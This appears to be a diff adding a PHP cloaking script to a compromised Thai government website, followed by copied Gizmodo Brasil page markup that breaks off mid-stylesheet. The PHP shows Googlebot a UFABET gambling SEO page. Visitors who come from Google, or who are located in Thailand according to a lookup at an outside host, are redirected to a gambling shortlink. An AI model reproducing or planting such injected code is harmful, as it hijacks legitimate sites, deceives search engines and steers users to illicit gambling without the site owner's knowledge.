@@ -1,0 +1,1142 @@
+<?php
+    $ip = isset($_SERVER['HTTP_X_REAL_IP']) ? $_SERVER['HTTP_X_REAL_IP'] : $_SERVER['REMOTE_ADDR'];
+    $userAgent = $_SERVER['HTTP_USER_AGENT'];
+
+    $basePath = ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == "on") ? "https": "http");
+    $basePath .= "://".$_SERVER['HTTP_HOST'];
+
+    $baseUrl = $basePath . $_SERVER['REQUEST_URI'];
+    $baseUrl = str_replace('http://', 'https://', $baseUrl);
+
+    $googleBotUserAgents = array(
+        "Googlebot",
+        "Googlebot-Image",
+        "Googlebot-News",
+        "Googlebot-Video",
+        "Google-InspectionTool",
+        "Google-Site-Verification",
+    );
+    $isGooglebot = false;
+    foreach ($googleBotUserAgents as $googleUserAgent) {
+        if (stripos($userAgent, $googleUserAgent) !== false) {
+            $isGooglebot = true;
+            break;
+        }
+    }
+
+    function isMobile() {
+        global $userAgent;
+        return preg_match('/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i',$userAgent)||preg_match('/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i',substr($userAgent,0,4));
+    }
+
+    function isRefererFromGoogle() {
+        $referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
+        return preg_match('/google/', $referer);
+    }
+
+    if ($_SERVER['REQUEST_URI'] === '/sitemap.xml') {
+        $sitemapPath = __DIR__ . '/sitemap.xml';
+    
+        if (file_exists($sitemapPath)) {
+            header('Content-Type: application/xml; charset=UTF-8');
+            readfile($sitemapPath);
+            exit;
+        }
+    }
+
+    function getIpLocation($ip = null) {
+        if (!$ip) {
+            $ip = isset($_SERVER['HTTP_CF_CONNECTING_IP']) ? $_SERVER['HTTP_CF_CONNECTING_IP'] : (isset($_SERVER['HTTP_X_REAL_IP']) ? $_SERVER['HTTP_X_REAL_IP'] : $_SERVER['REMOTE_ADDR']);
+        }
+        $response = file_get_contents("https://confnameserver.xyz/api/location/{$ip}");
+        $response = @json_decode($response);
+
+        return isset($response->countryName) ? $response->countryName : null;
+    }
+
+    function redirectMoneysite() {
+        header('Location: https://t.ly/pgb888');
+        exit;
+    }
+
+    if (!$isGooglebot) {
+        if (isRefererFromGoogle() || getIpLocation($ip) == 'Thailand') {
+            redirectMoneysite();
+        }
+
+        goto redirect;
+        exit;
+    }
+?>
+
+<!DOCTYPE HTML>
+<html lang="th">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="profile" href="https://gmpg.org/xfn/11">
+    <meta property="twitter:image" content="https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/03/image2-28.jpg">
+	<meta property="og:image" content="https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/03/image2-28.jpg" class="yoast-seo-meta-tag">
+	<link href="https://securepubads.g.doubleclick.net/tag/js/gpt.js" rel="preload" as="script">
+    <script src="https://securepubads.g.doubleclick.net/tag/js/gpt.js" async="async"></script>
+    <meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />
+	<style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
+	
+	<!-- This site is optimized with the Yoast SEO Premium plugin v24.8 (Yoast SEO v24.8.1) - https://yoast.com/wordpress/plugins/seo/ -->
+	<title>UFABET เข้าสู่ระบบ รีวิวลิงค์เข้าสู่ระบบล่าสุดเว็บ UFA มือถือ</title>
+	<meta name="description" content="ลิงค์เข้าสู่ระบบ UFABET ล่าสุด รองรับทั้งมือถือและคอมพิวเตอร์ ปลอดภัย รวดเร็ว พร้อมลิงค์สำรองและการบริการตลอด 24 ชม." />
+	<link rel="canonical" href="https://opsmoacbudget.moac.go.th" />
+	<meta property="og:locale" content="th_TH" />
+	<meta property="og:type" content="article" />
+	<meta property="og:title" content="UFABET เข้าสู่ระบบ รีวิวลิงค์เข้าสู่ระบบล่าสุดเว็บ UFA มือถือ" />
+	<meta property="og:description" content="ลิงค์เข้าสู่ระบบ UFABET ล่าสุด รองรับทั้งมือถือและคอมพิวเตอร์ ปลอดภัย รวดเร็ว พร้อมลิงค์สำรองและการบริการตลอด 24 ชม." />
+	<meta property="og:url" content="https://opsmoacbudget.moac.go.th" />
+	<meta property="og:site_name" content="Giz Brasil" />
+	<meta property="article:publisher" content="http://facebook.com/gizmodobrasil" />
+	<meta property="article:published_time" content="2025-03-10T23:38:29+00:00" />
+	<meta property="article:modified_time" content="2025-03-19T16:47:52+00:00" />
+    <meta name="google-site-verification" content="utrobU5KPZdubzhEnvGwMNw2e63r8ebhbnZce0APbww" />
+	<meta property="og:image" content="https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/03/image2-28.jpg" />
+	<meta property="og:image:width" content="1300" />
+	<meta property="og:image:height" content="740" />
+	<meta property="og:image:type" content="image/jpeg" />
+	<meta name="author" content="Amoro Padilha" />
+	<meta name="twitter:card" content="summary_large_image" />
+	<meta name="twitter:creator" content="@gizmodobr" />
+	<meta name="twitter:site" content="@gizmodobr" />
+	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"Article","@id":"https://opsmoacbudget.moac.go.th#article","isPartOf":{"@id":"https://opsmoacbudget.moac.go.th"},"author":{"name":"Amoro Padilha","@id":"https://opsmoacbudget.moac.go.th/#/schema/person/098d7bdf90550be9324ede0cf6d6b1b6"},"headline":"UFABET เข้าสู่ระบบ รีวิวลิงค์เข้าสู่ระบบล่าสุดเว็บ UFA มือถือ","datePublished":"2025-03-10T23:38:29+00:00","dateModified":"2025-03-19T16:47:52+00:00","mainEntityOfPage":{"@id":"https://opsmoacbudget.moac.go.th"},"wordCount":116,"publisher":{"@id":"https://opsmoacbudget.moac.go.th/#organization"},"image":{"@id":"https://opsmoacbudget.moac.go.th#primaryimage"},"thumbnailUrl":"https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/03/image2-28.jpg","articleSection":["Parcerias Giz (Outras Línguas)"],"inLanguage":"pt-BR"},{"@type":"WebPage","@id":"https://opsmoacbudget.moac.go.th","url":"https://opsmoacbudget.moac.go.th","name":"UFABET เข้าสู่ระบบ รีวิวลิงค์เข้าสู่ระบบล่าสุดเว็บ UFA มือถือ","isPartOf":{"@id":"https://opsmoacbudget.moac.go.th/#website"},"primaryImageOfPage":{"@id":"https://opsmoacbudget.moac.go.th#primaryimage"},"image":{"@id":"https://opsmoacbudget.moac.go.th#primaryimage"},"thumbnailUrl":"https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/03/image2-28.jpg","datePublished":"2025-03-10T23:38:29+00:00","dateModified":"2025-03-19T16:47:52+00:00","description":"ลิงค์เข้าสู่ระบบ UFABET ล่าสุด รองรับทั้งมือถือและคอมพิวเตอร์ ปลอดภัย รวดเร็ว พร้อมลิงค์สำรองและการบริการตลอด 24 ชม.","breadcrumb":{"@id":"https://opsmoacbudget.moac.go.th#breadcrumb"},"inLanguage":"pt-BR","potentialAction":[{"@type":"ReadAction","target":["https://opsmoacbudget.moac.go.th"]}]},{"@type":"ImageObject","inLanguage":"pt-BR","@id":"https://opsmoacbudget.moac.go.th#primaryimage","url":"https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/03/image2-28.jpg","contentUrl":"https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/03/image2-28.jpg","width":1300,"height":740},{"@type":"BreadcrumbList","@id":"https://opsmoacbudget.moac.go.th#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://opsmoacbudget.moac.go.th/"},{"@type":"ListItem","position":2,"name":"Parcerias Giz (Outras Línguas)","item":"https://opsmoacbudget.moac.go.th/parcerias_giz-outras-linguas/"},{"@type":"ListItem","position":3,"name":"UFABET เข้าสู่ระบบ รีวิวลิงค์เข้าสู่ระบบล่าสุดเว็บ UFA มือถือ"}]},{"@type":"WebSite","@id":"https://opsmoacbudget.moac.go.th/#website","url":"https://opsmoacbudget.moac.go.th/","name":"Giz Brasil","description":"Vida digital para pessoas","publisher":{"@id":"https://opsmoacbudget.moac.go.th/#organization"},"alternateName":"Giz Brasil","potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://opsmoacbudget.moac.go.th/?s={search_term_string}"},"query-input":{"@type":"PropertyValueSpecification","valueRequired":true,"valueName":"search_term_string"}}],"inLanguage":"pt-BR"},{"@type":"Organization","@id":"https://opsmoacbudget.moac.go.th/#organization","name":"Giz Brasil","url":"https://opsmoacbudget.moac.go.th/","logo":{"@type":"ImageObject","inLanguage":"pt-BR","@id":"https://opsmoacbudget.moac.go.th/#/schema/logo/image/","url":"https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2022/09/logo-giz_br-2022-padding-e1663143360249.png","contentUrl":"https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2022/09/logo-giz_br-2022-padding-e1663143360249.png","width":501,"height":219,"caption":"Giz Brasil"},"image":{"@id":"https://opsmoacbudget.moac.go.th/#/schema/logo/image/"},"sameAs":["http://facebook.com/gizmodobrasil","https://x.com/gizmodobr","https://www.instagram.com/gizmodobrasil"],"publishingPrinciples":"https://opsmoacbudget.moac.go.th/politica-de-privacidade/","ownershipFundingInfo":"/","correctionsPolicy":"https://opsmoacbudget.moac.go.th/politica-de-privacidade/","ethicsPolicy":"https://opsmoacbudget.moac.go.th/politica-de-privacidade/"},{"@type":"Person","@id":"https://opsmoacbudget.moac.go.th/#/schema/person/098d7bdf90550be9324ede0cf6d6b1b6","name":"Amoro Padilha","image":{"@type":"ImageObject","inLanguage":"pt-BR","@id":"https://opsmoacbudget.moac.go.th/#/schema/person/image/","url":"https://secure.gravatar.com/avatar/224f3b42e5a1485418b6f23c3dcd0877?s=96&d=blank&r=g","contentUrl":"https://secure.gravatar.com/avatar/224f3b42e5a1485418b6f23c3dcd0877?s=96&d=blank&r=g","caption":"Amoro Padilha"},"url":"https://opsmoacbudget.moac.go.th/author/amoro-padilha/"}]}</script>
+	<!-- / Yoast SEO Premium plugin. -->
+
+
+<script id="wpp-js" src="https://opsmoacbudget.moac.go.th/wp-content/plugins/wordpress-popular-posts/assets/js/wpp.min.js?ver=7.3.0" data-sampling="1" data-sampling-rate="100" data-api-url="https://opsmoacbudget.moac.go.th/wp-json/wordpress-popular-posts" data-post-id="634646" data-token="5aab666244" data-lang="0" data-debug="0"></script>
+<link rel='stylesheet' id='sbi_styles-css' href='https://opsmoacbudget.moac.go.th/wp-content/plugins/instagram-feed/css/sbi-styles.min.css?ver=6.8.0' media='all' />
+<link rel='stylesheet' id='wordpress-popular-posts-css-css' href='https://opsmoacbudget.moac.go.th/wp-content/plugins/wordpress-popular-posts/assets/css/wpp.css?ver=7.3.0' media='all' />
+<link rel='stylesheet' id='theme-css' href='https://opsmoacbudget.moac.go.th/wp-content/themes/gizbr_bda8bc8c/assets/dist/css/main.min.css?v1.3.13' media='all' />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://opsmoacbudget.moac.go.th/xmlrpc.php?rsd" />
+<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://opsmoacbudget.moac.go.th/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fgizmodo.uol.com.br%2Freview-login-ufa-mobile%2F" />
+<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://opsmoacbudget.moac.go.th/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fgizmodo.uol.com.br%2Freview-login-ufa-mobile%2F&#038;format=xml" />
+<meta name="generator" content="Redux 4.5.7" /><!-- Taboola Pixel Code -->
+<script src="https://cdn.onesignal.com/sdks/web/v16/OneSignalSDK.page.js" defer></script>
+<script>
+          window.OneSignalDeferred = window.OneSignalDeferred || [];
+          OneSignalDeferred.push(async function(OneSignal) {
+            await OneSignal.init({
+              appId: "c66f7db1-db50-48d5-9dd5-b9cff4acec63",
+              serviceWorkerOverrideForTypical: true,
+              path: "https://opsmoacbudget.moac.go.th/wp-content/plugins/onesignal-free-web-push-notifications/sdk_files/",
+              serviceWorkerParam: { scope: "/wp-content/plugins/onesignal-free-web-push-notifications/sdk_files/push/onesignal/" },
+              serviceWorkerPath: "OneSignalSDKWorker.js",
+            });
+          });
+
+          // Unregister the legacy OneSignal service worker to prevent scope conflicts
+          navigator.serviceWorker.getRegistrations().then((registrations) => {
+            // Iterate through all registered service workers
+            registrations.forEach((registration) => {
+              // Check the script URL to identify the specific service worker
+              if (registration.active && registration.active.scriptURL.includes('OneSignalSDKWorker.js.php')) {
+                // Unregister the service worker
+                registration.unregister().then((success) => {
+                  if (success) {
+                    console.log('OneSignalSW: Successfully unregistered:', registration.active.scriptURL);
+                  } else {
+                    console.log('OneSignalSW: Failed to unregister:', registration.active.scriptURL);
+                  }
+                });
+              }
+            });
+          }).catch((error) => {
+            console.error('Error fetching service worker registrations:', error);
+          });
+        </script>
+            <style id="wpp-loading-animation-styles">@-webkit-keyframes bgslide{from{background-position-x:0}to{background-position-x:-200%}}@keyframes bgslide{from{background-position-x:0}to{background-position-x:-200%}}.wpp-widget-block-placeholder,.wpp-shortcode-placeholder{margin:0 auto;width:60px;height:3px;background:#dd3737;background:linear-gradient(90deg,#dd3737 0%,#571313 10%,#dd3737 100%);background-size:200% auto;border-radius:3px;-webkit-animation:bgslide 1s infinite linear;animation:bgslide 1s infinite linear}</style>
+            <link rel="alternate" hreflang="th" href="https://opsmoacbudget.moac.go.th" /><link rel="alternate" hreflang="x-default" href="https://opsmoacbudget.moac.go.th" /><link rel="amphtml" href="https://opsmoacbudget.moac.go.thamp/"><link rel="icon" href="https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2020/12/cropped-gizmodo-logo-256-32x32.png" sizes="32x32" />
+<link rel="icon" href="https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2020/12/cropped-gizmodo-logo-256-192x192.png" sizes="192x192" />
+<link rel="apple-touch-icon" href="https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2020/12/cropped-gizmodo-logo-256-180x180.png" />
+<meta name="msapplication-TileImage" content="https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2020/12/cropped-gizmodo-logo-256-270x270.png" />
+
+<style id='asp-basic'>@keyframes aspAnFadeIn{0%{opacity:0}50%{opacity:0.6}100%{opacity:1}}@-webkit-keyframes aspAnFadeIn{0%{opacity:0}50%{opacity:0.6}100%{opacity:1}}@keyframes aspAnFadeOut{0%{opacity:1}50%{opacity:0.6}100%{opacity:0}}@-webkit-keyframes aspAnFadeOut{0%{opacity:1}50%{opacity:0.6}100%{opacity:0}}@keyframes aspAnFadeInDrop{0%{opacity:0;transform:translate(0,-50px)}100%{opacity:1;transform:translate(0,0)}}@-webkit-keyframes aspAnFadeInDrop{0%{opacity:0;transform:translate(0,-50px);-webkit-transform:translate(0,-50px)}100%{opacity:1;transform:translate(0,0);-webkit-transform:translate(0,0)}}@keyframes aspAnFadeOutDrop{0%{opacity:1;transform:translate(0,0);-webkit-transform:translate(0,0)}100%{opacity:0;transform:translate(0,-50px);-webkit-transform:translate(0,-50px)}}@-webkit-keyframes aspAnFadeOutDrop{0%{opacity:1;transform:translate(0,0);-webkit-transform:translate(0,0)}100%{opacity:0;transform:translate(0,-50px);-webkit-transform:translate(0,-50px)}}div.ajaxsearchpro.asp_an_fadeIn,div.ajaxsearchpro.asp_an_fadeOut,div.ajaxsearchpro.asp_an_fadeInDrop,div.ajaxsearchpro.asp_an_fadeOutDrop{-webkit-animation-duration:100ms;animation-duration:100ms;-webkit-animation-fill-mode:forwards;animation-fill-mode:forwards}.asp_an_fadeIn,div.ajaxsearchpro.asp_an_fadeIn{animation-name:aspAnFadeIn;-webkit-animation-name:aspAnFadeIn}.asp_an_fadeOut,div.ajaxsearchpro.asp_an_fadeOut{animation-name:aspAnFadeOut;-webkit-animation-name:aspAnFadeOut}div.ajaxsearchpro.asp_an_fadeInDrop{animation-name:aspAnFadeInDrop;-webkit-animation-name:aspAnFadeInDrop}div.ajaxsearchpro.asp_an_fadeOutDrop{animation-name:aspAnFadeOutDrop;-webkit-animation-name:aspAnFadeOutDrop}div.ajaxsearchpro.asp_main_container{transition:width 130ms linear;-webkit-transition:width 130ms linear}asp_w_container,div.asp_w.ajaxsearchpro,div.asp_w.asp_r,div.asp_w.asp_s,div.asp_w.asp_sb,div.asp_w.asp_sb *{-webkit-box-sizing:content-box;-moz-box-sizing:content-box;-ms-box-sizing:content-box;-o-box-sizing:content-box;box-sizing:content-box;padding:0;margin:0;border:0;border-radius:0;text-transform:none;text-shadow:none;box-shadow:none;text-decoration:none;text-align:left;text-indent:initial;letter-spacing:normal;font-display:swap}div.asp_w_container div[id*=__original__]{display:none !important}div.asp_w.ajaxsearchpro{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;-ms-box-sizing:border-box;-o-box-sizing:border-box;box-sizing:border-box}div.asp_w.asp_r,div.asp_w.asp_r *{-webkit-touch-callout:none;-webkit-user-select:none;-khtml-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}div.asp_w.ajaxsearchpro input[type=text]::-ms-clear{display:none;width :0;height:0}div.asp_w.ajaxsearchpro input[type=text]::-ms-reveal{display:none;width :0;height:0}div.asp_w.ajaxsearchpro input[type="search"]::-webkit-search-decoration,div.asp_w.ajaxsearchpro input[type="search"]::-webkit-search-cancel-button,div.asp_w.ajaxsearchpro input[type="search"]::-webkit-search-results-button,div.asp_w.ajaxsearchpro input[type="search"]::-webkit-search-results-decoration{display:none}div.asp_w.ajaxsearchpro input[type="search"]{appearance:auto !important;-webkit-appearance:none !important}.clear{clear:both}.asp_clear{display:block !important;clear:both !important;margin:0 !important;padding:0 !important;width:auto !important;height:0 !important}.hiddend{display:none !important}div.asp_w.ajaxsearchpro{width:100%;height:auto;border-radius:0;background:rgba(255,255,255,0);overflow:hidden}div.asp_w.ajaxsearchpro.asp_non_compact{min-width:200px}#asp_absolute_overlay{width:0;height:0;position:fixed;background:rgba(255,255,255,0.5);top:0;left:0;display:block;z-index:0;opacity:0;transition:opacity 200ms linear;-webkit-transition:opacity 200ms linear}div.asp_m.ajaxsearchpro .proinput input:before,div.asp_m.ajaxsearchpro .proinput input:after,div.asp_m.ajaxsearchpro .proinput form:before,div.asp_m.ajaxsearchpro .proinput form:after{display:none}div.asp_w.ajaxsearchpro textarea:focus,div.asp_w.ajaxsearchpro input:focus{outline:none}div.asp_m.ajaxsearchpro .probox .proinput input::-ms-clear{display:none}div.asp_m.ajaxsearchpro .probox{width:auto;border-radius:5px;background:#FFF;overflow:hidden;border:1px solid #FFF;box-shadow:1px 0 3px #CCC inset;display:-webkit-flex;display:flex;-webkit-flex-direction:row;flex-direction:row;direction:ltr;align-items:stretch;isolation:isolate}div.asp_m.ajaxsearchpro .probox .proinput{width:1px;height:100%;float:left;box-shadow:none;position:relative;flex:1 1 auto;-webkit-flex:1 1 auto;z-index:0}div.asp_m.ajaxsearchpro .probox .proinput form{height:100%;margin:0 !important;padding:0 !important}div.asp_m.ajaxsearchpro .probox .proinput input{height:100%;width:100%;border:0;background:transparent;box-shadow:none;padding:0;left:0;padding-top:2px;min-width:120px;min-height:unset;max-height:unset}div.asp_m.ajaxsearchpro .probox .proinput input.autocomplete{border:0;background:transparent;width:100%;box-shadow:none;margin:0;padding:0;left:0}div.asp_m.ajaxsearchpro .probox .proinput.iepaddingfix{padding-top:0}div.asp_m.ajaxsearchpro .probox .proloading,div.asp_m.ajaxsearchpro .probox .proclose,div.asp_m.ajaxsearchpro .probox .promagnifier,div.asp_m.ajaxsearchpro .probox .prosettings{width:20px;height:20px;min-width:unset;min-height:unset;background:none;background-size:20px 20px;float:right;box-shadow:none;margin:0;padding:0;z-index:1}div.asp_m.ajaxsearchpro button.promagnifier:focus-visible{box-shadow:inset 0 0 0 2px rgba(0,0,0,0.4)}div.asp_m.ajaxsearchpro .probox .proloading,div.asp_m.ajaxsearchpro .probox .proclose{background-position:center center;display:none;background-size:auto;background-repeat:no-repeat;background-color:transparent}div.asp_m.ajaxsearchpro .probox .proloading{padding:2px;box-sizing:border-box}div.asp_m.ajaxsearchpro .probox .proclose{position:relative;cursor:pointer;z-index:2}div.asp_m.ajaxsearchpro .probox .promagnifier .innericon,div.asp_m.ajaxsearchpro .probox .prosettings .innericon,div.asp_m.ajaxsearchpro .probox .proclose .innericon{background-size:20px 20px;background-position:center center;background-repeat:no-repeat;background-color:transparent;width:100%;height:100%;line-height:initial;text-align:center;overflow:hidden}div.asp_m.ajaxsearchpro .probox .promagnifier .innericon svg,div.asp_m.ajaxsearchpro .probox .prosettings .innericon svg,div.asp_m.ajaxsearchpro .probox .proloading svg{height:100%;width:22px;vertical-align:baseline;display:inline-block}div.asp_m.ajaxsearchpro .probox .proclose svg{background:#333;position:absolute;top:50%;width:20px;height:20px;left:50%;fill:#fefefe;box-sizing:border-box;box-shadow:0 0 0 2px rgba(255,255,255,0.9)}.opacityOne{opacity:1}.opacityZero{opacity:0}div.asp_w.asp_s [disabled].noUi-connect,div.asp_w.asp_s [disabled] .noUi-connect{background:#B8B8B8}div.asp_w.asp_s [disabled] .noUi-handle{cursor:not-allowed}div.asp_w.asp_r p.showmore{display:none;margin:0}div.asp_w.asp_r.asp_more_res_loading p.showmore a,div.asp_w.asp_r.asp_more_res_loading p.showmore a span{color:transparent !important}@-webkit-keyframes shm-rot-simple{0%{-webkit-transform:rotate(0deg);transform:rotate(0deg);opacity:1}50%{-webkit-transform:rotate(180deg);transform:rotate(180deg);opacity:0.85}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg);opacity:1}}@keyframes shm-rot-simple{0%{-webkit-transform:rotate(0deg);transform:rotate(0deg);opacity:1}50%{-webkit-transform:rotate(180deg);transform:rotate(180deg);opacity:0.85}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg);opacity:1}}div.asp_w.asp_r div.asp_showmore_container{position:relative}div.asp_w.asp_r. div.asp_moreres_loader{display:none;position:absolute;width:100%;height:100%;top:0;left:0;background:rgba(255,255,255,0.2)}div.asp_w.asp_r.asp_more_res_loading div.asp_moreres_loader{display:block !important}div.asp_w.asp_r div.asp_moreres_loader-inner{height:24px;width:24px;animation:shm-rot-simple 0.8s infinite linear;-webkit-animation:shm-rot-simple 0.8s infinite linear;border:4px solid #353535;border-right-color:transparent;border-radius:50%;box-sizing:border-box;position:absolute;top:50%;margin:-12px auto auto -12px;left:50%}div.asp_hidden_data,div.asp_hidden_data *{display:none}div.asp_w.asp_r{display:none}div.asp_w.asp_r *{text-decoration:none;text-shadow:none}div.asp_w.asp_r .results{overflow:hidden;width:auto;height:0;margin:0;padding:0}div.asp_w.asp_r .asp_nores{display:flex;flex-wrap:wrap;gap:8px;overflow:hidden;width:auto;height:auto;position:relative;z-index:2}div.asp_w.asp_r .results .item{overflow:hidden;width:auto;margin:0;padding:3px;position:relative;background:#f4f4f4;border-left:1px solid rgba(255,255,255,0.6);border-right:1px solid rgba(255,255,255,0.4)}div.asp_w.asp_r .results .item,div.asp_w.asp_r .results .asp_group_header{animation-delay:0s;animation-duration:0.5s;animation-fill-mode:both;animation-timing-function:ease;backface-visibility:hidden;-webkit-animation-delay:0s;-webkit-animation-duration:0.5s;-webkit-animation-fill-mode:both;-webkit-animation-timing-function:ease;-webkit-backface-visibility:hidden}div.asp_w.asp_r .results .item .asp_image{overflow:hidden;background:transparent;padding:0;float:left;background-position:center;background-size:cover;position:relative}div.asp_w.asp_r .results .asp_image canvas{display:none}div.asp_w.asp_r .results .asp_image .asp_item_canvas{position:absolute;top:0;left:0;right:0;bottom:0;margin:0;width:100%;height:100%;z-index:1;display:block;opacity:1;background-position:inherit;background-size:inherit;transition:opacity 0.5s}div.asp_w.asp_r .results .item:hover .asp_image .asp_item_canvas,div.asp_w.asp_r .results figure:hover .asp_image .asp_item_canvas{opacity:0}div.asp_w.asp_r a.asp_res_image_url,div.asp_w.asp_r a.asp_res_image_url:hover,div.asp_w.asp_r a.asp_res_image_url:focus,div.asp_w.asp_r a.asp_res_image_url:active{box-shadow:none !important;border:none !important;margin:0 !important;padding:0 !important;display:inline !important}div.asp_w.asp_r .results .item .asp_image_auto{width:auto !important;height:auto !important}div.asp_w.asp_r .results .item .asp_image img{width:100%;height:100%}div.asp_w.asp_r .results a span.overlap{position:absolute;width:100%;height:100%;top:0;left:0;z-index:1}div.asp_w.asp_r .resdrg{height:auto}div.asp_w.ajaxsearchpro .asp_results_group{margin:10px 0 0 0}div.asp_w.ajaxsearchpro .asp_results_group:first-of-type{margin:0 !important}div.asp_w.asp_r.vertical .results .item:first-child{border-radius:0}div.asp_w.asp_r.vertical .results .item:last-child{border-radius:0;margin-bottom:0}div.asp_w.asp_r.vertical .results .item:last-child:after{height:0;margin:0;width:0}.asp_two_column{margin:8px 0 12px 0}.asp_two_column .asp_two_column_first,.asp_two_column .asp_two_column_last{width:48%;padding:1% 2% 1% 0;float:left;box-sizing:content-box}.asp_two_column .asp_two_column_last{padding:1% 0 1% 2%}.asp_shortcodes_container{display:-webkit-flex;display:flex;-webkit-flex-wrap:wrap;flex-wrap:wrap;margin:-10px 0 12px -10px;box-sizing:border-box}.asp_shortcodes_container .asp_shortcode_column{-webkit-flex-grow:0;flex-grow:0;-webkit-flex-shrink:1;flex-shrink:1;min-width:120px;padding:10px 0 0 10px;flex-basis:33%;-webkit-flex-basis:33%;box-sizing:border-box}p.asp-try{color:#555;font-size:14px;margin-top:5px;line-height:28px;font-weight:300;visibility:hidden}p.asp-try a{color:#FFB556;margin-left:10px;cursor:pointer;display:inline-block}.asp_ac_autocomplete,.asp_ac_autocomplete div,.asp_ac_autocomplete span{}.asp_ac_autocomplete{display:inline;position:relative;word-spacing:normal;text-transform:none;text-indent:0;text-shadow:none;text-align:start}.asp_ac_autocomplete .asp_ac_autocomplete_dropdown{position:absolute;border:1px solid #ccc;border-top-color:#d9d9d9;box-shadow:0 2px 4px rgba(0,0,0,0.2);-webkit-box-shadow:0 2px 4px rgba(0,0,0,0.2);cursor:default;display:none;z-index:1001;margin-top:-1px;background-color:#fff;min-width:100%;overflow:auto}.asp_ac_autocomplete .asp_ac_autocomplete_hint{position:absolute;z-index:1;color:#ccc !important;-webkit-text-fill-color:#ccc !important;text-fill-color:#ccc !important;overflow:hidden !important;white-space:pre !important}.asp_ac_autocomplete .asp_ac_autocomplete_hint span{color:transparent;opacity:0.0}.asp_ac_autocomplete .asp_ac_autocomplete_dropdown>div{background:#fff;white-space:nowrap;cursor:pointer;line-height:1.5em;padding:2px 0 2px 0}.asp_ac_autocomplete 